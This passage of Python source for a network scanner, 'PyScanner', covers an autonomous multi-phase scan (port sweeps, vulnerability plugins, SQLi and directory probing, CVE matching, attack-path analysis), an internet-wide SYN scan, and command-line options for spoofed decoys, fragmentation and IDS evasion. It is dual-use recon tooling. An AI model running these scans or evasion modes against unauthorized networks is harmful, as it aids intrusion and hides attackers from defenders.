# Each phase's output feeds the next (e.g. phase 1 host list → phase 2).
# ═══════════════════════════════════════════════════════════════════

@dataclass
class AutonomousResult:
    target:       str
    host_results: List["HostResult"]
    subdomains:   List["SubdomainResult"]
    web_findings: Dict[str, List["WebFinding"]]   # url → findings
    attack_paths: Dict[str, List["AttackPath"]]   # ip  → paths
    cve_matches:  Dict[str, List["CveRecord"]]    # "ip:port" → CVEs
    report_path:  Optional[str] = None
    map_path:     Optional[str] = None
    duration_sec: float = 0.0


class AutonomousScanner:
    """
    [ENH-20] Autonomous multi-phase scanner.

    Usage::

        scanner = AutonomousScanner("192.168.1.0/24",
                                     domain="example.com",
                                     output_dir="/tmp/scan_out",
                                     verbose=True)
        result = scanner.run()
    """

    PHASE_NAMES = {
        1:  "Discovery       (fast SYN sweep)",
        2:  "Deep scan       (full port range on live hosts)",
        3:  "Service probes  (banners + version detection)",
        4:  "OS fingerprint  (T1–T7 + ECN + IE)",
        5:  "Vulnerability   (60 plugins)",
        6:  "Web audit       (HTTP headers + SQLi + dirs)",
        7:  "CVE matching    (local DB + optional NVD)",
        8:  "Attack paths    (AI recon engine)",
        9:  "Subdomains      (DNS enumeration)",
        10: "Report          (HTML + visual map)",
    }

    def __init__(self, targets: str,
                 domain:     Optional[str]  = None,
                 output_dir: str            = ".",
                 timeout:    float          = 1.5,
                 rate_pps:   int            = 500,
                 use_nvd:    bool           = False,
                 verbose:    bool           = True,
                 phases:     Optional[List[int]] = None):
        self.targets    = targets
        self.domain     = domain
        self.output_dir = output_dir
        self.timeout    = timeout
        self.rate_pps   = rate_pps
        self.use_nvd    = use_nvd
        self.verbose    = verbose
        self.phases     = phases or list(range(1, 11))
        self._result: Optional[AutonomousResult] = None

    def _log(self, phase: int, msg: str) -> None:
        if self.verbose:
            name = self.PHASE_NAMES.get(phase, f"Phase {phase}")
            print(color(f"\n[AUTO/{phase}] {name}", CYAN))
            print(color(f"      → {msg}", WHITE))

    def _run_phase1_discovery(self) -> List[str]:
        """Fast SYN sweep to identify live hosts."""
        self._log(1, f"Scanning {self.targets} — top 100 ports")
        import argparse as _ap
        # Expand targets
        live: List[str] = []
        if "/" in self.targets:
            candidates = expand_cidr(self.targets, force_large=False)
        else:
            candidates = [self.targets]

        for ip in candidates:
            up, _, _ = icmp_ping(ip, timeout=0.5)
            if up:
                live.append(ip)

        self._log(1, f"Found {len(live)} live hosts: {live[:10]}{'...' if len(live)>10 else ''}")
        return live

    def _run_phase2_deep(self, live_hosts: List[str]) -> Dict[str, List[int]]:
        """Full port scan on live hosts."""
        self._log(2, f"Full scan of {len(live_hosts)} hosts")
        host_ports: Dict[str, List[int]] = {}
        top_ports = parse_ports(
            "21,22,23,25,53,80,110,111,135,139,143,161,443,445,465,587,"
            "631,993,995,1433,1521,1883,2375,2379,3306,3389,5432,5900,"
            "5984,6379,6443,8080,8443,8888,9090,9092,9200,11211,27017")
        for ip in live_hosts:
            try:
                results = tcp_connect_scan(ip, top_ports,
                                            timeout=self.timeout,
                                            max_workers=50)
                open_p = [p for p, r in results.items() if r.state == "open"]
                if open_p:
                    host_ports[ip] = open_p
                    self._log(2, f"{ip}: {len(open_p)} open ports → {open_p[:8]}")
            except Exception:
                pass
        return host_ports

    def _run_phase3_probes(self,
                            host_ports: Dict[str, List[int]]) -> Dict[str, Dict]:
        """Service probe + banner grab on open ports."""
        self._log(3, f"Probing services on {len(host_ports)} hosts")
        banners: Dict[str, Dict] = {}
        for ip, ports in host_ports.items():
            banners[ip] = {}
            for port in ports:
                version, banner = run_service_probe(ip, port, self.timeout)
                banners[ip][port] = {"version": version, "banner": banner}
        return banners

    def _build_host_results(self,
                             host_ports: Dict[str, List[int]],
                             banners: Dict[str, Dict]) -> List["HostResult"]:
        """Assemble HostResult objects from phase 2+3 data."""
        results: List["HostResult"] = []
        for ip, ports in host_ports.items():
            hr = HostResult(ip=ip, status="up")
            hr.hostname = reverse_dns(ip)
            for port in ports:
                pr = PortResult(port=port, protocol="tcp",
                                state="open",
                                reason="syn-ack",
                                service=service_name(port))
                b = banners.get(ip, {}).get(port, {})
                pr.version = b.get("version", "")
                pr.banner  = b.get("banner",  "")
                hr.ports[port] = pr
            results.append(hr)
        return results

    def _run_phase5_plugins(self,
                             host_results: List["HostResult"]) -> None:
        """Run vulnerability plugins on all open ports."""
        self._log(5, f"Running {len(BUILTIN_PLUGINS)} plugins")
        for hr in host_results:
            for port, pr in hr.ports.items():
                if pr.state == "open":
                    pr.plugin_results = run_plugins(
                        hr.ip, port, "tcp",
                        BUILTIN_PLUGINS, self.timeout)

    def _run_phase6_web(self,
                         host_results: List["HostResult"]
                         ) -> Dict[str, List["WebFinding"]]:
        """Run web_audit on all HTTP/HTTPS services."""
        self._log(6, "Web audit on HTTP/HTTPS ports")
        web_results: Dict[str, List["WebFinding"]] = {}
        for hr in host_results:
            for port, pr in hr.ports.items():
                if pr.state != "open":
                    continue
                if port in {80, 8080, 8000, 8008, 8888, 3000}:
                    url = f"http://{hr.ip}:{port}"
                elif port in {443, 8443, 4443}:
                    url = f"https://{hr.ip}:{port}"
                else:
                    continue
                try:
                    findings = web_audit(url, timeout=self.timeout,
                                          test_sqli=True, brute_dirs=True)
                    if findings:
                        web_results[url] = findings
                        self._log(6,
                            f"{url}: {len(findings)} findings "
                            f"(critical: {sum(1 for f in findings if f.severity=='CRITICAL')})")
                except Exception:
                    pass
        return web_results

    def _run_phase7_cve(self,
                         host_results: List["HostResult"]
                         ) -> Dict[str, List["CveRecord"]]:
        """CVE lookup on all service versions."""
        self._log(7, "CVE matching against local DB")
        cve_results: Dict[str, List["CveRecord"]] = {}
        for hr in host_results:
            for port, pr in hr.ports.items():
                if pr.state == "open" and pr.version:
                    cves = run_cve_lookup(pr.version, use_nvd=self.use_nvd)
                    if cves:
                        key = f"{hr.ip}:{port}"
                        cve_results[key] = cves
                        self._log(7,
                            f"{key} ({pr.version}): "
                            f"{len(cves)} CVEs — highest: {cves[0].cve_id} "
                            f"({cves[0].severity})")
        return cve_results

    def _run_phase8_attack_paths(self,
                                  host_results: List["HostResult"]
                                  ) -> Dict[str, List["AttackPath"]]:
        """Analyze attack paths for every host."""
        self._log(8, "AI recon — attack path analysis")
        attack_results: Dict[str, List["AttackPath"]] = {}
        for hr in host_results:
            paths = analyze_attack_paths(hr)
            if paths:
                attack_results[hr.ip] = paths
                critical = [p for p in paths if p.impact == "CRITICAL"]
                self._log(8,
                    f"{hr.ip}: {len(paths)} paths, "
                    f"{len(critical)} CRITICAL — e.g. {paths[0].name}")
        return attack_results

    def _run_phase9_subdomains(self) -> List["SubdomainResult"]:
        """DNS subdomain enumeration if domain provided."""
        if not self.domain:
            return []
        self._log(9, f"Enumerating subdomains of {self.domain}")
        subs = enumerate_subdomains(self.domain, threads=50)
        self._log(9, f"Found {len(subs)} subdomains")
        return subs

    def _run_phase10_report(self,
                             host_results: List["HostResult"],
                             subdomains:   List["SubdomainResult"]
                             ) -> Tuple[str, str]:
        """Generate HTML report and visual map."""
        import os as _os
        _os.makedirs(self.output_dir, exist_ok=True)
        report_path = _os.path.join(self.output_dir, "pyscanner_report.html")
        map_path    = _os.path.join(self.output_dir, "pyscanner_map.html")
        dot_path    = _os.path.join(self.output_dir, "pyscanner_map.dot")

        self._log(10, f"Writing HTML report → {report_path}")
        export_html_report(host_results, report_path,
                            title="PyScanner Autonomous Scan Report",
                            use_nvd=self.use_nvd)

        self._log(10, f"Writing visual map  → {map_path}")
        export_d3_map(host_results, map_path)
        export_graphviz_map(host_results, dot_path)

        return report_path, map_path

    def run(self) -> "AutonomousResult":
        """Execute all configured phases and return combined results."""
        t0 = time.time()
        print(color(
            f"\n{'═'*60}\n"
            f"  PyScanner AUTONOMOUS MODE\n"
            f"  Target: {self.targets}"
            + (f"  Domain: {self.domain}" if self.domain else "")
            + f"\n  Phases: {self.phases}\n"
            f"{'═'*60}", CYAN))

        # Phase 1 — discovery
        live_hosts: List[str] = []
        if 1 in self.phases:
            live_hosts = self._run_phase1_discovery()
        else:
            # Treat all targets as live if skipping discovery
            if "/" in self.targets:
                live_hosts = expand_cidr(self.targets)
            else:
                live_hosts = [self.targets]

        if not live_hosts:
            print(color("[AUTO] No live hosts found — aborting.", YELLOW))
            return AutonomousResult(
                target=self.targets, host_results=[],
                subdomains=[], web_findings={},
                attack_paths={}, cve_matches={},
                duration_sec=time.time()-t0)

        # Phase 2 — deep scan
        host_ports: Dict[str, List[int]] = {}
        if 2 in self.phases:
            host_ports = self._run_phase2_deep(live_hosts)

        # Phase 3 — service probes
        banners: Dict[str, Dict] = {}
        if 3 in self.phases and host_ports:
            banners = self._run_phase3_probes(host_ports)

        # Build HostResult list
        host_results = self._build_host_results(host_ports, banners)

        # Phase 5 — plugins
        if 5 in self.phases and host_results:
            self._run_phase5_plugins(host_results)

        # Phase 6 — web audit
        web_findings: Dict[str, List["WebFinding"]] = {}
        if 6 in self.phases and host_results:
            web_findings = self._run_phase6_web(host_results)

        # Phase 7 — CVE
        cve_matches: Dict[str, List["CveRecord"]] = {}
        if 7 in self.phases and host_results:
            cve_matches = self._run_phase7_cve(host_results)

        # Phase 8 — attack paths
        attack_paths: Dict[str, List["AttackPath"]] = {}
        if 8 in self.phases and host_results:
            attack_paths = self._run_phase8_attack_paths(host_results)

        # Phase 9 — subdomains
        subdomains: List["SubdomainResult"] = []
        if 9 in self.phases:
            subdomains = self._run_phase9_subdomains()

        # Phase 10 — report
        report_path = map_path = None
        if 10 in self.phases and host_results:
            report_path, map_path = self._run_phase10_report(
                host_results, subdomains)

        duration = time.time() - t0
        print(color(
            f"\n{'═'*60}\n"
            f"  AUTONOMOUS SCAN COMPLETE  ({duration:.1f}s)\n"
            f"  Hosts found:   {len(host_results)}\n"
            f"  Open ports:    {sum(len(hr.ports) for hr in host_results)}\n"
            f"  CVEs matched:  {sum(len(v) for v in cve_matches.values())}\n"
            f"  Attack paths:  {sum(len(v) for v in attack_paths.values())}\n"
            f"  Web findings:  {sum(len(v) for v in web_findings.values())}\n"
            + (f"  Report:        {report_path}\n" if report_path else "")
            + (f"  Map:           {map_path}\n" if map_path else "")
            + f"{'═'*60}", GREEN))

        self._result = AutonomousResult(
            target       = self.targets,
            host_results = host_results,
            subdomains   = subdomains,
            web_findings = web_findings,
            attack_paths = attack_paths,
            cve_matches  = cve_matches,
            report_path  = report_path,
            map_path     = map_path,
            duration_sec = duration,
        )
        return self._result


# ═══════════════════════════════════════════════════════════════════
# [ENH-21] INTERNET-SCALE BATCH SCANNING
# ═══════════════════════════════════════════════════════════════════
#
# Extends the stateless SYN engine (ENH-8) + target permutation
# (ENH-11) with:
#
#   • IPv4 space partitioning: /8 → /16 → /24 blocks
#   • Blacklist: RFC1918, loopback, multicast, IANA reserved
#   • Bandwidth estimator: calculates achievable pps from
#     network interface speed
#   • Progress reporting: hosts/sec, estimated completion time
#   • Result streaming: yields results as they arrive rather
#     than buffering everything in memory
#   • Resume: writes checkpoint file after each /24 block
#
# This is the same architecture as ZMap's internet-wide scan mode.
# Python's GIL limits raw pps vs C tools, but the architecture is
# identical.
# ═══════════════════════════════════════════════════════════════════

# Reserved ranges to exclude from internet-scale scans
_RESERVED_NETWORKS = [
    ipaddress.ip_network("0.0.0.0/8"),
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("100.64.0.0/10"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.0.0.0/24"),
    ipaddress.ip_network("192.0.2.0/24"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("198.18.0.0/15"),
    ipaddress.ip_network("198.51.100.0/24"),
    ipaddress.ip_network("203.0.113.0/24"),
    ipaddress.ip_network("224.0.0.0/4"),
    ipaddress.ip_network("240.0.0.0/4"),
    ipaddress.ip_network("255.255.255.255/32"),
]


def _is_public_ip(ip_obj: ipaddress.IPv4Address) -> bool:
    """[ENH-21] Return True if ip_obj is a globally-routable address."""
    return not any(ip_obj in net for net in _RESERVED_NETWORKS)


def _partition_ipv4_space(cidr: str = "0.0.0.0/0",
                            block_size: int = 24
                            ) -> List[ipaddress.IPv4Network]:
    """
    [ENH-21] Partition a CIDR into /block_size sub-networks.
    Excludes reserved ranges.  Default: all of IPv4 in /24 blocks.
    """
    parent = ipaddress.ip_network(cidr, strict=False)
    blocks: List[ipaddress.IPv4Network] = []
    for subnet in parent.subnets(new_prefix=block_size):
        # Skip if entirely within a reserved range
        if any(subnet.subnet_of(r) or r.subnet_of(subnet)
               for r in _RESERVED_NETWORKS):
            continue
        blocks.append(subnet)
    return blocks


def estimate_scan_duration(total_hosts: int,
                             ports_per_host: int,
                             rate_pps: int,
                             timeout_sec: float = 2.0) -> Dict[str, float]:
    """
    [ENH-21] Estimate scan duration given parameters.

    Returns dict with:
        total_probes    — total SYN packets to send
        send_time_sec   — time to send all probes at rate_pps
        recv_time_sec   — additional receive window
        total_time_sec  — estimated total wall-clock time
        rate_pps        — effective rate
    """
    total_probes   = total_hosts * ports_per_host
    send_time_sec  = total_probes / max(1, rate_pps)
    recv_time_sec  = timeout_sec * 2
    total_time_sec = send_time_sec + recv_time_sec
    return {
        "total_probes":   float(total_probes),
        "send_time_sec":  send_time_sec,
        "recv_time_sec":  recv_time_sec,
        "total_time_sec": total_time_sec,
        "rate_pps":       float(rate_pps),
        "hosts_per_sec":  rate_pps / max(1, ports_per_host),
    }


def internet_scale_scan(ports:          List[int],
                          cidr:           str   = "0.0.0.0/0",
                          rate_pps:       int   = 1000,
                          timeout:        float = 2.0,
                          block_size:     int   = 24,
                          checkpoint_dir: Optional[str]  = None,
                          resume_from:    Optional[str]  = None,
                          permute_seed:   Optional[int]  = None,
                          exclude_file:   Optional[str]  = None,
                          ) -> "InternetScanResult":
    """
    [ENH-21] Internet-scale stateless SYN scan.

    Scans cidr (default: entire IPv4 internet, excluding reserved)
    in /block_size (default /24) chunks using the stateless HMAC ISN
    engine (ENH-8) and ZMap cyclic permutation (ENH-11).

    Architecture identical to ZMap's internet-wide scan:
        partition → permute blocks → stateless SYN → collect

    Parameters:
        ports           — list of ports to probe per host
        cidr            — IPv4 CIDR to scan (default all public IPs)
        rate_pps        — max packets per second
        timeout         — per-block receive window
        block_size      — subnet prefix length (/24 recommended)
        checkpoint_dir  — directory to write per-block checkpoints
        resume_from     — path to checkpoint file to resume from
        permute_seed    — seed for block permutation
        exclude_file    — text file with one CIDR/IP per line to skip

    Returns InternetScanResult with aggregated findings.
    """
    import os as _os

    # Load exclude list
    excluded_nets: List[ipaddress.IPv4Network] = list(_RESERVED_NETWORKS)
    if exclude_file and _os.path.exists(exclude_file):
        with open(exclude_file) as ef:
            for line in ef:
                line = line.strip()
                if line and not line.startswith("#"):
                    try:
                        excluded_nets.append(
                            ipaddress.ip_network(line, strict=False))
                    except ValueError:
                        pass

    # Partition the address space
    blocks = _partition_ipv4_space(cidr, block_size)

    # Permute block order (ENH-11)
    if permute_seed is None:
        permute_seed = random.randint(0, 2**31 - 1)
    block_strs = [str(b) for b in blocks]
    permuted   = list(TargetPermutator(block_strs, seed=permute_seed))
    blocks     = [ipaddress.ip_network(s) for s in permuted]

    # Resume logic
    start_idx = 0
    if resume_from and _os.path.exists(resume_from):
        try:
            import json as _j
            with open(resume_from) as rf:
                ckpt = _j.load(rf)
            start_idx = ckpt.get("next_block_idx", 0)
            print(color(f"[ENH-21] Resuming from block {start_idx}/{len(blocks)}", CYAN))
        except Exception:
            pass

    result = InternetScanResult(
        cidr=cidr, ports=ports, rate_pps=rate_pps,
        permute_seed=permute_seed, total_blocks=len(blocks))

    t0        = time.time()
    secret    = os.urandom(16)

    print(color(
        f"\n[ENH-21] Internet-scale scan\n"
        f"  CIDR:    {cidr}\n"
        f"  Blocks:  {len(blocks)} /{block_size} subnets\n"
        f"  Ports:   {ports}\n"
        f"  Rate:    {rate_pps} pps\n"
        f"  Seed:    {permute_seed}", CYAN))

    est = estimate_scan_duration(
        len(blocks) * (2**(32-block_size) - 2),
        len(ports), rate_pps, timeout)
    print(color(
        f"  Estimated time: {est['total_time_sec']:.0f}s "
        f"({est['total_time_sec']/60:.1f} min)", YELLOW))

    for idx, block in enumerate(blocks[start_idx:], start=start_idx):
        # Skip excluded
        if any(block.subnet_of(e) or e.subnet_of(block)
               for e in excluded_nets):
            continue

        # Get host IPs in this block (permuted)
        block_hosts = [str(h) for h in block.hosts()]
        block_hosts = list(TargetPermutator(block_hosts, seed=permute_seed))

        # Scan each host using stateless engine
        for host_ip in block_hosts:
            try:
                host_results = stateless_syn_scan(
                    host_ip, ports, timeout=timeout,
                    secret=secret)
                open_ports = {p: r for p, r in host_results.items()
                               if r.state == "open"}
                if open_ports:
                    result.add_host(host_ip, open_ports)
            except Exception:
                pass

        result.blocks_done += 1

        # Progress
        if idx % 100 == 0 and idx > 0:
            elapsed  = time.time() - t0
            rate     = result.blocks_done / max(1, elapsed)
            eta      = (len(blocks) - idx) / max(0.01, rate)
            print(color(
                f"  [{idx}/{len(blocks)}] "
                f"{result.hosts_found} hosts found  "
                f"ETA: {eta:.0f}s", WHITE),
                end="\r")

        # Checkpoint
        if checkpoint_dir and idx % 256 == 0:
            _os.makedirs(checkpoint_dir, exist_ok=True)
            import json as _j
            ckpt_path = _os.path.join(checkpoint_dir,
                                       f"ckpt_{permute_seed}.json")
            with open(ckpt_path, "w") as cf:
                _j.dump({"next_block_idx": idx + 1,
                          "hosts_found": result.hosts_found,
                          "seed": permute_seed}, cf)

    result.duration_sec = time.time() - t0
    print(color(
        f"\n[ENH-21] Complete: {result.hosts_found} hosts with open ports "
        f"in {result.duration_sec:.1f}s", GREEN))
    return result


@dataclass
class InternetScanResult:
    """[ENH-21] Aggregated result from internet_scale_scan()."""
    cidr:          str
    ports:         List[int]
    rate_pps:      int
    permute_seed:  int
    total_blocks:  int
    blocks_done:   int = 0
    hosts_found:   int = 0
    duration_sec:  float = 0.0
    _open_hosts:   Dict[str, Dict[int, PortResult]] = field(default_factory=dict)

    def add_host(self, ip: str, open_ports: Dict[int, PortResult]) -> None:
        self._open_hosts[ip] = open_ports
        self.hosts_found = len(self._open_hosts)

    def iter_hosts(self):
        """Iterate over (ip, open_ports_dict) tuples."""
        return self._open_hosts.items()

    def summary(self) -> str:
        return (f"Internet scan of {self.cidr}\n"
                f"  {self.hosts_found} hosts with open ports\n"
                f"  {self.blocks_done}/{self.total_blocks} blocks scanned\n"
                f"  {self.duration_sec:.1f}s elapsed")


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="pyscanner",
        description="PyScanner v9.0 - professional Python network scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python pyscanner.py -t 192.168.1.1 -p 1-1024
  python pyscanner.py -t 10.0.0.0/24 --ping-scan --threads 200
  python pyscanner.py -t example.com -p 80,443 --banner --http-headers
  python pyscanner.py -t 192.168.1.1 -p 22,80,443 --scan-type syn
  python pyscanner.py -t 192.168.1.1 -p 1-65535 --scan-type syn --rate 500
  python pyscanner.py -t 2001:db8::1 -p 80,443 --ipv6
  python pyscanner.py -t 192.168.1.0/24 --arp-scan
  python pyscanner.py -t 8.8.8.8 --traceroute
  python pyscanner.py -t example.com --whois -o report.json
        """
    )
    p.add_argument("-t", "--targets", nargs="+", required=True,
                   metavar="TARGET",
                   help="IP, hostname, or CIDR (e.g. 192.168.1.0/24)")
    p.add_argument("-p", "--ports", default=None,
                   help="Ports: '22', '80,443', '1-1024', 'top100'")
    p.add_argument("--scan-type",
                   choices=["connect", "syn", "udp",
                            "null", "fin", "xmas", "ack", "window"],
                   default="connect",
                   help=("[UPG-3] Scan method (default: connect). "
                         "Stealth types (null/fin/xmas) bypass stateless FW. "
                         "ack/window map firewall rules."))
    p.add_argument("-T", "--timing", type=int, choices=range(6),
                   default=3, metavar="0-5",
                   help=("[UPG-3] Timing mode 0=paranoid..5=insane "
                         "(like Nmap -T). Overrides --timeout/--threads/--rate. "
                         "T4+ activates async engine. Default: 3 (normal)"))
    p.add_argument("--scripts", action="store_true",
                   help=("[UPG-2] Run built-in NSE-style plugins after scan: "
                         "http-title, ftp-anon, ssl-cert, redis-info, "
                         "smb-os, ssh-auth. Implies --banner."))
    p.add_argument("--plugin-dir", metavar="DIR", default="",
                   help=("[UPG-2] Load external plugins from directory "
                         "(each .py file exports NAME, PORTS, PROTOCOL, run())"))
    p.add_argument("--async", dest="use_async", action="store_true",
                   help=("[UPG-4] Force async event-loop SYN engine "
                         "(auto-enabled at -T4/-T5). 10-50x faster."))
    p.add_argument("--ping-scan", action="store_true",
                   help="Ping sweep only, no port scan")
    p.add_argument("--skip-ping", action="store_true",
                   help="Skip host discovery, assume all hosts up")
    p.add_argument("--arp-scan", action="store_true",
                   help="ARP scan for LAN host discovery")
    p.add_argument("--timeout", type=float, default=1.0,
                   help="Socket timeout in seconds (default: 1.0, overridden by -T)")
    p.add_argument("--threads", type=int, default=100,
                   help="Max concurrent threads (default: 100, overridden by -T)")
    p.add_argument("--banner", action="store_true",
                   help="Grab service banners from open ports")
    p.add_argument("--http-headers", action="store_true",
                   help="Fetch HTTP/HTTPS response headers")
    p.add_argument("--traceroute", action="store_true",
                   help="Run traceroute to each up host (first 3)")
    p.add_argument("--max-hops", type=int, default=30,
                   help="Max hops for traceroute (default: 30)")
    p.add_argument("--whois", action="store_true",
                   help="Whois lookup on each target IP")
    p.add_argument("-o", "--output", metavar="FILE",
                   help="Save report (.json or .txt)")
    p.add_argument("--randomise", action="store_true",
                   help="Randomise port scan order + add inter-probe jitter")
    p.add_argument("--rate", type=float, default=0, metavar="PPS",
                   help="[FIX-26] Max packets per second (0=unlimited, overridden by -T)")
    p.add_argument("--ipv6", action="store_true",
                   help="[FIX-27] Prefer IPv6 addresses when resolving hostnames")
    p.add_argument("--exclude", default="", metavar="HOSTS",
                   help="[FIX-35] Comma-separated IPs, CIDRs, or ranges to skip")
    p.add_argument("--force-large", action="store_true",
                   help="[FIX-33] Allow scanning networks larger than /16 (>65534 hosts)")
    p.add_argument("--deep-fp", action="store_true",
                   help=("[ENH-3] Enable deep OS fingerprinting engine "
                         "(sends T1-T7 + IE + ECN probes, like Nmap)"))
    p.add_argument("--checkpoint", metavar="FILE", default="",
                   help=("[ENH-6] Save scan state to FILE after each host "
                         "(allows --resume after interruption)"))
    p.add_argument("--resume", metavar="FILE", default="",
                   help=("[ENH-6] Resume a previous scan from checkpoint FILE"))
    p.add_argument("--adaptive", action="store_true",
                   help=("[ENH-1] Enable adaptive congestion control "
                         "(auto-enabled at -T4/-T5)"))
    p.add_argument("--distributed", action="store_true",
                   help=("[V9-2] Run distributed multi-process scan "
                         "(splits targets across --workers processes)"))
    p.add_argument("--workers", type=int, default=4,
                   help=("[V9-2] Number of parallel worker processes for "
                         "distributed scanning (default: 4)"))
    p.add_argument("--worker-server", action="store_true",
                   help=("[V9-2] Start a DistributedWorkerServer HTTP agent "
                         "on this machine for remote coordination"))
    p.add_argument("--worker-port", type=int, default=9876,
                   help="[V9-2] Port for the worker server (default: 9876)")
    p.add_argument("--topology", action="store_true",
                   help=("[V9-6] Print ASCII network topology tree after scan"))
    p.add_argument("--output-xml", metavar="FILE", default="",
                   help=("[V9-5] Save Nmap-compatible XML report"))
    p.add_argument("--output-csv", metavar="FILE", default="",
                   help=("[V9-5] Save CSV report (one row per open port)"))
    # ── [ENH-8/9/10] Advanced stealth flags ──────────────────────────────
    p.add_argument("--stateless", action="store_true",
                   help=("[ENH-8] Stateless SYN scan (ZMap/Masscan architecture). "
                         "Encodes (ip,port) into TCP ISN via HMAC — no probe_map "
                         "state table. O(1) memory regardless of scan size. "
                         "Requires --scan-type syn and root."))
    p.add_argument("--decoys", metavar="D1,D2,...", default="",
                   help=("[ENH-9] Decoy scan: send spoofed SYNs from these IPs "
                         "before each real probe (Nmap -D equivalent). "
                         "Use 'rand:N' for N random decoy IPs, "
                         "e.g. --decoys rand:5 or --decoys 1.2.3.4,5.6.7.8. "
                         "Requires --scan-type syn and root."))
    p.add_argument("--fragment", action="store_true",
                   help=("[ENH-10] Fragment each SYN across two IP fragments "
                         "(IDS/ACL evasion). TCP header split at byte 8. "
                         "Reassembled by target before TCP processing. "
                         "Requires --scan-type syn, root, and IPv4."))
    p.add_argument("--permute", action="store_true",
                   help=("[ENH-11] Permute target and port order using a "
                         "deterministic cyclic-group algorithm (ZMap-style). "
                         "Avoids sequential sweep patterns that IDS detects. "
                         "Spreads load uniformly across subnets. "
                         "Implies --randomise. Use --permute-seed for reproducibility."))
    p.add_argument("--permute-seed", type=int, default=None, metavar="N",
                   help=("[ENH-11] Integer seed for --permute (makes scan order "
                         "reproducible; also enables resume from known position). "
                         "If omitted, a random seed is chosen each run."))

    # ── [ENH-19] Visual map ──────────────────────────────────────────
    p.add_argument("--map", metavar="FILE.html",
                   help=("[ENH-19] Write interactive D3.js network map to FILE.html. "
                         "Nodes colour-coded by risk. Click for port details. "
                         "Also writes FILE.dot (Graphviz) if graphviz is installed."))
    p.add_argument("--map-ascii", action="store_true",
                   help=("[ENH-19] Print ASCII network topology tree to stdout "
                         "after scan (always available, no dependencies)."))
    p.add_argument("--map-gateway", metavar="IP",
                   help="[ENH-19] Specify gateway IP for network map (default: auto).")

    # ── [ENH-20] Autonomous mode ─────────────────────────────────────
    p.add_argument("--auto", action="store_true",
                   help=("[ENH-20] Autonomous scan mode: runs all 10 phases "
                         "(discovery → deep scan → probes → OS → plugins → "
                         "web audit → CVE → attack paths → subdomains → report). "
                         "Outputs HTML report and interactive network map."))
    p.add_argument("--auto-domain", metavar="DOMAIN",
                   help="[ENH-20] Domain to enumerate subdomains during autonomous scan.")
    p.add_argument("--auto-dir", metavar="DIR", default=".",
                   help="[ENH-20] Output directory for autonomous scan report (default: .).")
    p.add_argument("--auto-phases", metavar="1,2,3,...",
                   help=("[ENH-20] Comma-separated list of phases to run "
                         "(1=discovery, 2=deep, 3=probes, 4=OS, 5=plugins, "
                         "6=web, 7=CVE, 8=attack, 9=subdomain, 10=report). "
                         "Default: all 10."))

    # ── [ENH-21] Internet-scale scan ─────────────────────────────────
    p.add_argument("--internet-scan", action="store_true",
                   help=("[ENH-21] Internet-scale stateless scan (ZMap architecture). "
                         "Scans entire IPv4 public address space (or --target CIDR) "
                         "in permuted /24 blocks. Requires --scan-type syn + root."))
    p.add_argument("--internet-cidr", metavar="CIDR", default="0.0.0.0/0",
                   help="[ENH-21] CIDR to scan in internet-scale mode (default: all public IPv4).")
    p.add_argument("--internet-rate", type=int, default=1000, metavar="PPS",
                   help="[ENH-21] Packets-per-second for internet-scale scan (default: 1000).")
    p.add_argument("--internet-checkpoint", metavar="DIR",
                   help="[ENH-21] Directory to write per-/24-block checkpoints for resume.")
    p.add_argument("--internet-resume", metavar="FILE",
                   help="[ENH-21] Checkpoint JSON file to resume internet-scale scan from.")
    p.add_argument("--internet-exclude", metavar="FILE",
                   help="[ENH-21] Text file with CIDRs/IPs to exclude (one per line).")

    # ── [ENH-14] CVE flags ───────────────────────────────────────────
    p.add_argument("--cve", action="store_true",
                   help="[ENH-14] Run CVE lookup on all detected service versions.")
    p.add_argument("--nvd", action="store_true",
                   help=("[ENH-14] Enrich CVE results via NVD REST API v2.0 "
                         "(requires internet access)."))

    # ── [ENH-16] HTML report ─────────────────────────────────────────
    p.add_argument("--output-html", metavar="FILE",
                   help=("[ENH-16] Write HTML pentest report to FILE "
                         "(auto-converts to PDF if wkhtmltopdf/weasyprint found)."))

    # ── [ENH-17] Subdomain enumeration ──────────────────────────────
    p.add_argument("--subdomain", metavar="DOMAIN",
                   help="[ENH-17] Enumerate subdomains of DOMAIN via DNS brute force.")
    p.add_argument("--subdomain-wordlist", metavar="FILE",
                   help="[ENH-17] Custom wordlist file for subdomain enumeration.")

    # ── [ENH-18] Web audit ───────────────────────────────────────────
    p.add_argument("--web-audit", metavar="URL",
                   help=("[ENH-18] Run web audit against URL "
                         "(HTTP header check + dir brute + SQLi detection)."))

    # ── [ENH-15] Attack path analysis ────────────────────────────────
    p.add_argument("--ai-recon", action="store_true",
                   help=("[ENH-15] Print AI recon attack path analysis after scan."))

    p.add_argument("-v", "--verbose", action="store_true",
                   help="Show closed/filtered ports and worker errors")
    return p


def main():
    global _RATE_LIMITER

    print(color(BANNER_ART, CYAN))
    args = build_parser().parse_args()

    if args.ports == "top100":
        args.ports = TOP_100_PORTS
    if args.ping_scan:
        args.ports = None

    # [UPG-2] --scripts implies banner grabbing
    if args.scripts:
        args.banner = True

    # [FIX-29] / [FIX-26] Activate rate limiter if --rate given
    # (May be overridden by -T timing mode inside PyScanner.__init__)
    if args.rate and args.rate > 0:
        _RATE_LIMITER = TokenBucket(rate_pps=args.rate)

    # [FIX-29] / [FIX-27] Pass IPv6 preference
    args._prefer_ipv6 = getattr(args, "ipv6", False)

    # [UPG-3] Print active timing mode
    t_level = getattr(args, "timing", 3)
    if t_level in T_MODES:
        tm = T_MODES[t_level]
        print(color(
            f"[*] Timing mode: -T{t_level} ({tm.name}) "
            f"timeout={tm.timeout}s  parallelism={tm.parallelism}"
            + (f"  rate={tm.max_rate}pps" if tm.max_rate else "  rate=unlimited"),
            CYAN))

    # [UPG-4] Print async mode status
    if getattr(args, "use_async", False) or t_level >= 4:
        print(color("[*] Async engine: ENABLED (asyncio event loop)", CYAN))

    # [ENH-8] Stateless scan flag
    if getattr(args, "stateless", False):
        if args.scan_type != "syn":
            print(color("[!] --stateless requires --scan-type syn", YELLOW))
            args.stateless = False
        else:
            print(color(
                f"[*] Stateless scan: ENABLED  "
                f"(ISN=HMAC(secret,ip,port), no probe_map, O(1) memory)",
